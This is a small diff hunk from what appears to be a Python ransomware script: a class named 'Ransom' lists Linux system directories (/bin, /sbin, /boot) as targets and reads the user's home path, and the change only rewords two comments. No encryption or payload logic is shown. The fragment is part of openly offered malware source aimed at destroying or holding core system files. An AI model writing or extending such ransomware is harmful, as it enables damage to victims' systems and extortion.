@@ -6,11 +6,11 @@ import requests
 import sys
 #  import pyaes optional library
 class Ransom:
-    path_dicts = {  #  here is the targets directories
+    path_dicts = {  #  here is the linux targets directories
         "bin" : "/bin",
         "sbin" : "/sbin"
     }
-    path_boot = { #  here is the boot dict
+    path_boot = { #  linux boot dict
         "boot" : "/boot"
     }
     user_path = os.getenv("HOMEPATH")
